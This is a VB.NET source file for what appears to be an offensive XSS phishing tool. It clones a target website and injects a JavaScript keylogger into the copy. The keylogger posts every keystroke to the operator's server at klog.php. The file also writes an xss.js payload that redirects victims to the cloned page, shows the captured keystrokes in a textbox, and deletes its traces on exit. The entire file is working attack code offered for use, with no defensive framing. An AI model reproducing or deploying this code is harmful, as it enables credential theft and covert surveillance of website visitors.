Imports System.Net
Imports System.IO

Public Class xss_phish

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If url.Text = "" Then
            MsgBox("No Website Specified!", vbCritical)
        Else
            Try
                Dim request As WebRequest = WebRequest.Create(url.Text)
                If My.Settings.proxy_enabled = True Then

                    Try
                        Dim myProxy As New WebProxy()
                        Dim newUri As New Uri("http://" & My.Settings.proxy_host & ":" & My.Settings.proxy_port)
                        myProxy.Address = newUri
                        myProxy.Credentials = New NetworkCredential(My.Settings.proxy_us, My.Settings.proxy_ps)
                        request.Proxy = myProxy
                    Catch ex As Exception
                        MsgBox(ex.Message.ToString, vbCritical)
                    End Try

                End If
                request.Method = "GET"
                DirectCast(request, System.Net.HttpWebRequest).UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.38) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.26529)"
                Dim response As WebResponse = request.GetResponse()
                Dim dataStream As Stream = response.GetResponseStream()
                Dim reader As New StreamReader(dataStream)
                Dim responseFromServer As String = reader.ReadToEnd()
                Dim stream As New IO.StreamWriter(Application.StartupPath & "\index.html")
                stream.Write(responseFromServer)
                stream.WriteLine("<script>document.onkeypress = function(evt) { evt = evt || window.event ")
                stream.WriteLine("key = String.fromCharCode(evt.charCode); if (key) { ")
                stream.WriteLine("var http;  if (window.XMLHttpRequest){http=new XMLHttpRequest();} else if (window.ActiveXObject){ http=new ActiveXObject('Microsoft.XMLHTTP');} var param = encodeURI(key)")
                stream.WriteLine("http.open('POST','http://" & xss_server.server_ip & "/klog.php',true);")
                stream.WriteLine("http.setRequestHeader('Content-type','application/x-www-form-urlencoded'); http.send('key='+param);}}</script>")
                stream.Close()
                reader.Close()
                response.Close()
                Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
                streamx.Write("document.location='http://" & xss_server.server_ip & "/index.html';")
                streamx.Close()
                Timer1.Enabled = True
                Button2.Enabled = True
                MsgBox("Page Fetched and Injected!", vbInformation)
            Catch x As Exception
                MsgBox(x.Message.ToString, vbCritical)
            End Try
        End If
    End Sub

    Private Sub xss_phish_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Enabled = False
        Button2.Enabled = False
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            Dim line As String
            Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\logs.txt")
            line = readfile.ReadToEnd()
            TextBox2.Text = line
            readfile.Close()
            readfile = Nothing
        Catch

        End Try
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        TextBox2.Text = ""
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        On Error Resume Next
        IO.File.Delete("index.html")
        IO.File.Delete("logs.txt")
        IO.File.Delete("xss.js")
        Me.Close()
    End Sub

   
End Class